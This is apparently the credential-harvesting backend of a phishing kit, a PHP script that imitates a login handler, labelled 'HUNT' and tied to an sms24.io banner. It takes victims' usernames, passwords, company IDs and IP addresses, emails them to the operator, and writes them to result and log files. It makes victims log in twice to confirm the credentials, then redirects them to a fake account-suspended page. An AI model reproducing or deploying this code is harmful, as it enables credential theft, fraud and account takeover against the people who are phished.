<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include "autob/bts2.php";
include "req/config.php";


$user = $_POST['username'];$password = $_POST['password'];

if(isset($_POST['username']) && isset($_POST['password'])){
    if(strlen($password) > 3 && strlen($user) > 5){
		
	///////////////////////// MAIL PART //////////////////////
		
		$comp  = $_POST['companyid']?$_POST['companyid']:'';
        $user        = $_POST['username'];
        $password     = $_POST['password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET['ct6'])){$reshead="|---------------- CONFIRM HUNT LOG ----------------|";$_SESSION['fullz'].=$Info_LOG;}
		else{$reshead="|------------------- NEW HUNT LOG -----------------|";$_SESSION['fullz']=$Info_LOG;};
        $Info_LOG = "
|--===-======-=======-- https://sms24.io --=======-======-===--|
$reshead
Company Id       : $comp
UserName         : $user 
Password         : $password "; 


// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' : New HUNT Log Result';$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		if(!isset($_GET['ct6'])){
			if (isset($_POST['companyid'])){header("location:login.php?accrXId=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&gtc=live&consentResponseUri=%2Fprotocol&ct6=On");}
			else {header("location:login.php?accrXId=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&consentResponseUri=%2Fprotocol&ct6=On");};
		}
		else{header("location:suspended.php?id=myaccount&y=".md5(rand(100, 999999999))."");};

    }
    else{
        date_default_timezone_set('GMT');
        $line = date('Y-m-d H:i:s') . " - $email:$password";
        if ($Ftp_Write == 1) {file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);};
		if (isset($_POST['companyid'])){header("location:login.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&ct6=On&gtc=live&consentResponseUri=%2Fprotocol");}
		else {header("location:login.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&consent_handled=true&ct6=On&consentResponseUri=%2Fprotocol");};
    };
}
else{
	if (isset($_POST['companyid'])){header("location:login.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&consent_handled=true&ct6=On&gtc=live&consentResponseUri=%2Fprotocol");}
	else {header("location:login.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&consent_handled=true&ct6=On&consentResponseUri=%2Fprotocol");};
};
?>